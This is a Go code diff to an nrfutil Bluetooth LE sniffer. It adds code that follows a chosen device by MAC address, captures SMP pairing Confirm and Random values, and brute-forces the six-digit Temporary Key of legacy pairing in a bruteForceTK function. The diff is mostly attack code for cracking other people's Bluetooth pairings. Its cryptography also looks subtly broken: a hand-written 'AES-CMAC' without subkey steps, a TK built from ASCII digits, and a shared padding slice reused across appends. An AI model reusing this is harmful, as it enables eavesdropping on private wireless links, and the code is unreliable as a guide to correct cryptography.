@@ -2,6 +2,7 @@ package nrfutil
 
 import (
 	"encoding/binary"
+	"crypto/aes"
 	"fmt"
 	"github.com/tarm/serial"
 	"log"
@@ -16,6 +17,8 @@ const (
 	SLIP_ESC_END   = SLIP_END + 1
 	SLIP_ESC_ESC   = SLIP_ESC + 1
 	REQ_FOLLOW     = 0x00
+	//EVENT_CONNECT = 0x05
+	//REQ_SCAN_CONT = 0x07
 	HEADER_LENGTH  = 6
 
 	PROTOVER_V1           = 1
@@ -98,10 +101,27 @@ type BLEPacket struct {
 
 type packetReader struct {
 	packetCounter int
+	state uint8
+}
+var reader = &packetReader{
+	packetCounter: 7,
+	state: 0x07,
 }
 
+type PairingData struct {
+	ConfirmA []byte
+	ConfirmB []byte
+	RandomA  []byte
+	RandomB  []byte
+	AddressA []byte // Initiator Address (6 bytes)
+	AddressB []byte // Responder Address (6 bytes)
+}
+
+var pairingData PairingData
 var PORT *serial.Port
-var MAC_ADDRESS string 
+var MAC_ADDRESS string
+var mac string= ""
+var macBytes []byte
 
 func ReadSerial(macAddress string) error {
 	MAC_ADDRESS = macAddress
@@ -276,12 +296,20 @@ func decodeSnifferPacket(packetList []byte) {
 		
 		//fmt.Printf("Advertising Address (Hex): % X\n", packet.blePacket.advAddress)
 		//fmt.Printf("Advertising Address (Dec): %d\n", packet.blePacket.advAddress)
-		macBytes := packet.blePacket.advAddress[:6]
-
-		mac := fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X", macBytes[0], macBytes[1], macBytes[2], macBytes[3], macBytes[4], macBytes[5])
-
-
-		fmt.Println("Advertising Address length: ", len(packet.blePacket.advAddress))
+		
+		if packet.id == EVENT_PACKET_ADV_PDU {
+			pduType := getPDUTypeDescription(packet.blePacket.advType)
+			if pduType == 0x5 {
+				pairingData.AddressA = packet.blePacket.advAddress[:6]
+				pairingData.AddressB = packet.blePacket.scanAddress[:6]
+			}
+			fmt.Printf("Advertising Address (Hex): % X\n", packet.blePacket.advAddress)
+			fmt.Printf("Advertising Address (Dec): %d\n", packet.blePacket.advAddress)
+			macBytes = packet.blePacket.advAddress[:6]
+			mac = fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X", macBytes[0], macBytes[1], macBytes[2], macBytes[3], macBytes[4], macBytes[5])
+			fmt.Println("MAC Address: ", mac)
+			fmt.Println("Advertising Address length: ", len(packet.blePacket.advAddress))
+		}
 		
 		fmt.Printf("BLE Packet Type (Hex): % X\n", packet.blePacket.packetType)
 		fmt.Printf("BLE Packet Type (Dec): %d\n", packet.blePacket.packetType)
@@ -292,17 +320,27 @@ func decodeSnifferPacket(packetList []byte) {
 		fmt.Println("BLE Packet Payload: ", packet.blePacket.payload)
 		fmt.Println("BLE Packet Payload Length: ", len(packet.blePacket.payload))
 
+		if packet.id == EVENT_PACKET_DATA_PDU {
 
-		reader := &packetReader{
-			packetCounter: 0,
+			if len(pairingData.ConfirmA) != 0 && len(pairingData.ConfirmB) != 0 && len(pairingData.RandomA) != 0 && len(pairingData.RandomB) != 0 {
+				fmt.Println("calling bruteforcetk")
+				bruteForceTK(pairingData)
+			}
+
+			parseL2CAP(packet.blePacket.payload)
 		}
-		fmt.Println("mac: ", mac)
-		if mac == MAC_ADDRESS {
-			fmt.Println("FOUND RASPBERRY PI!")
-			err := SendFollow(macBytes, false, false, false, reader)
 
+		if mac == MAC_ADDRESS && reader.state != REQ_FOLLOW {
+			fmt.Println("FOUND RASPBERRY PI!")
+			fmt.Println("mac: ", mac)
+			fmt.Println("MAC ADDRESS: ", MAC_ADDRESS)
+			//fmt.Printf("Reader state: % X\n", reader.state)
+			err := SendFollow(macBytes, false, false, false, reader)
 			if err != nil {
 				fmt.Println("ERROR: ", err)
+			} else {
+				fmt.Println("Updating reader state: ", REQ_FOLLOW)
+				reader.state = REQ_FOLLOW
 			}
 		}
 	}
@@ -316,6 +354,7 @@ func readFlags(packet *Packet) {
 	packet.micOK = (packet.flags & 8) != 0
 	packet.phy = (packet.flags >> 4) & 7
 	packet.OK = packet.crcOK && (packet.micOK || !packet.encrypted)
+	fmt.Println("Packet OK status in readFlags: ", packet.OK)
 
 }
 
@@ -334,8 +373,20 @@ func readPayload(packet *Packet) {
 		fmt.Println("Packet not validated.")
 	}
 
+	if packet.id == EVENT_PACKET_DATA_PDU {
+		fmt.Println("FOUND DATA PDU")
+	}
+	payload := packet.packetList[PAYLOAD_POS:PAYLOAD_POS + packet.payloadLength]
+
 	switch packet.id {
 	case EVENT_PACKET_ADV_PDU, EVENT_PACKET_DATA_PDU:
+
+		if packet.id == EVENT_PACKET_DATA_PDU {
+			fmt.Println("DATA PDU INFO")
+			fmt.Printf("Packet Packet List: % X\n", packet.packetList)
+			fmt.Printf("Packet Payload: % X\n", payload)
+		}
+
 		packet.bleHeaderLength = packet.packetList[BLE_HEADER_LEN_POS]
 		if packet.bleHeaderLength == BLE_HEADER_LENGTH {
 			packet.flags = packet.packetList[FLAGS_POS]
@@ -370,6 +421,7 @@ func readPayload(packet *Packet) {
 		} else {
 			fmt.Printf("Invalid BLE Header Length: %d\n", packet.bleHeaderLength)
 			packet.valid = false
+			//packet.OK = false
 		}
 		
 		if packet.OK {
@@ -388,7 +440,7 @@ func readPayload(packet *Packet) {
 			}
 
 			decodeBLEPacket(packet)
-			parseBLEPayload(packet.blePacket.payload)
+			//parseBLEPayload(packet.blePacket.payload)
 		}
 
 	case EVENT_FOLLOW:
@@ -417,15 +469,24 @@ func decodeBLEPacket(packet *Packet) {
 	offset = extractFormat(packet, offset)
 
 	if packet.blePacket.packetType == PACKET_TYPE_ADVERTISING {
+		fmt.Println("calling extractAdvHeader")
 		offset = extractAdvHeader(packet, offset)
 	} else {
+		fmt.Println("Calling extractConnHeader")
 		offset = extractConnHeader(packet, offset)
 	}
 	offset = extractLength(packet, offset)
 
+	// empty PDU
+	if packet.blePacket.length == 0 {
+		return
+	}
+
 	packet.blePacket.payload = packet.blePacket.packetList[offset:]
+	fmt.Printf("Printing the blePacket payload: % X\n", packet.blePacket.payload)
 
 	if packet.blePacket.packetType == PACKET_TYPE_ADVERTISING {
+		fmt.Println("Calling extract Addresses and extractName")
 		offset = extractAddresses(packet, offset)
 		extractName(packet, offset)
 	}
@@ -598,6 +659,99 @@ func parseTimeStamp(packet []byte) uint32 {
 	return binary.LittleEndian.Uint32(packet)
 }
 
+func parseL2CAP(payload []byte) {
+
+	if len(payload) < 4 {
+		fmt.Println("Invalid L2CAP payload length")
+		return
+	}
+
+	l2capLength := int(payload[0]) | int(payload[1])<<8
+	fmt.Printf("L2CAP Length: %d\n", l2capLength)
+
+	channelID := int(payload[2]) | int(payload[3])<<8
+	fmt.Printf("L2CAP Channel ID: 0x%04X\n", channelID)
+
+	if channelID != 0x0006 {
+		fmt.Println("l2 packet not smp")
+		return
+	}
+
+	fmt.Println("SMP Packet Detected")
+	smpPayload := payload[4:]
+	
+	if len(smpPayload) == 0 {
+		fmt.Println("No SMP payload to process")
+		return
+	}
+
+	opcode := smpPayload[0]
+	fmt.Printf("SMP Opcode: 0x%02X\n", opcode)
+
+	switch opcode {
+	case 0x01:
+		fmt.Println("Pairing Request detected")
+		parsePairingRequest(smpPayload)
+	case 0x02: 
+		fmt.Println("Pairing Response detected")
+		parsePairingResponse(smpPayload)
+	case 0x03:
+		fmt.Println("Pairing Confirm detected")
+		if len(pairingData.ConfirmA) == 0 {
+			pairingData.ConfirmA = parsePairingConfirm(smpPayload)
+		} else {
+			pairingData.ConfirmB = parsePairingConfirm(smpPayload)
+		}
+	case 0x04: 
+		fmt.Println("Pairing Random detected")
+		if len(pairingData.RandomA) == 0 {
+			pairingData.RandomA = parsePairingRandom(smpPayload)
+		} else {
+			pairingData.RandomB = parsePairingRandom(smpPayload)
+		}
+	default:
+		fmt.Println("Unknown SMP packet type")
+	}
+
+
+
+}
+
+// Helper function for parsing Pairing Confirm
+func parsePairingConfirm(payload []byte) []byte {
+	if len(payload) < 17 {
+		fmt.Println("Invalid Pairing Confirm payload length")
+		return nil
+	}
+	confirmValue := payload[1:17]
+	fmt.Printf("Pairing Confirm Value: %x\n", confirmValue)
+	return confirmValue
+}
+
+// Helper function for parsing Pairing Random
+func parsePairingRandom(payload []byte) []byte {
+	if len(payload) < 17 {
+		fmt.Println("Invalid Pairing Random payload length")
+		return nil
+	}
+	randomValue := payload[1:17]
+	fmt.Printf("Pairing Random Value: %x\n", randomValue)
+	return randomValue
+}
+
+// Stub functions for other packet types
+func parsePairingRequest(payload []byte) {
+	fmt.Println("Processing Pairing Request...")
+	fmt.Println(payload)
+	// Parse fields here if needed
+}
+
+func parsePairingResponse(payload []byte) {
+	fmt.Println("Processing Pairing Response...")
+	fmt.Println(payload)
+	// Parse fields here if needed
+}
+
 func parseBLEPayload(payload []byte) {
 	pos := 0
 	for pos < len(payload) {
@@ -689,5 +843,106 @@ func writeList(array []byte) error {
 	}
 
 	fmt.Println("Output from write: ", n)
+	return nil
+}
+
+func getPDUTypeDescription(pduType uint8) uint8 {
+    switch pduType {
+    case 0x0:
+        fmt.Println("ADV_IND (Connectable and scannable undirected advertising)")
+	return 0x0
+    case 0x1:
+        fmt.Println("ADV_DIRECT_IND (Connectable directed advertising)")
+	return 0x1
+    case 0x2:
+        fmt.Println("ADV_NONCONN_IND (Non-connectable undirected advertising)")
+	return 0x2
+    case 0x3:
+        fmt.Println("SCAN_REQ (Scan request from a scanner)")
+	return 0x3
+    case 0x4:
+        fmt.Println("SCAN_RSP (Scan response from an advertiser)")
+	return 0x4
+    case 0x5:
+        fmt.Println("CONNECT_IND (Connection request from an initiator)")
+	return 0x5
+    case 0x6:
+        fmt.Println("ADV_SCAN_IND (Scannable undirected advertising)")
+	return 0x6
+    case 0x7:
+        fmt.Println("RESERVED (Unused)")
+	return 0x7
+    default:
+        fmt.Println("UNKNOWN (Invalid or reserved PDU type)")
+	return 0x8
+    }
+}
+
+// AES-CMAC padding function
+func aesCMACPadding(input []byte) []byte {
+	padding := make([]byte, 16-len(input)%16)
+	return append(input, padding...)
+}
+
+// AES-CMAC calculation
+func aesCMAC(key, message []byte) []byte {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err)
+	}
+
+	message = aesCMACPadding(message)
+	cmac := make([]byte, 16)
+	iv := make([]byte, 16)
+
+	for i := 0; i < len(message); i += 16 {
+		for j := 0; j < 16; j++ {
+			cmac[j] = iv[j] ^ message[i+j]
+		}
+		block.Encrypt(cmac, cmac)
+		iv = cmac
+	}
+	return cmac
+}
+
+func bruteForceTK(pairingData PairingData) []byte {
+	fmt.Println("Inside bruteForceTK")
+	fmt.Println("Address A: ", pairingData.AddressA)
+	fmt.Println("Confirm A: ", pairingData.ConfirmA)
+	fmt.Println("Random A: ", pairingData.RandomA)
+
+	fmt.Println("Address B: ", pairingData.AddressB)
+	fmt.Println("Confirm B: ", pairingData.ConfirmB)
+	fmt.Println("Random B: ", pairingData.RandomB) 
+	var tk [16]byte
+	padding := make([]byte, 16)
+
+	for i := 0; i <= 999999; i++ {
+		// Convert TK to 6-digit PIN
+		tkString := fmt.Sprintf("%06d", i)
+		copy(tk[:], []byte(tkString))
+
+		// Construct message for ConfirmA: Padding || RandomA || AddressA || AddressB
+		messageA := append(padding, pairingData.RandomA...)
+		messageA = append(messageA, pairingData.AddressA...)
+		messageA = append(messageA, pairingData.AddressB...)
+
+		calculatedConfirmA := aesCMAC(tk[:], messageA)
+
+		// Construct message for ConfirmB: Padding || RandomB || AddressB || AddressA
+		messageB := append(padding, pairingData.RandomB...)
+		messageB = append(messageB, pairingData.AddressB...)
+		messageB = append(messageB, pairingData.AddressA...)
+
+		calculatedConfirmB := aesCMAC(tk[:], messageB)
+
+		// Compare calculated values with captured values
+		if string(calculatedConfirmA) == string(pairingData.ConfirmA) && string(calculatedConfirmB) == string(pairingData.ConfirmB) {
+			fmt.Printf("Found TK: %s\n", tkString)
+			return tk[:]
+		}
+	}
+
+	fmt.Println("TK not found")
 	return nil
 }
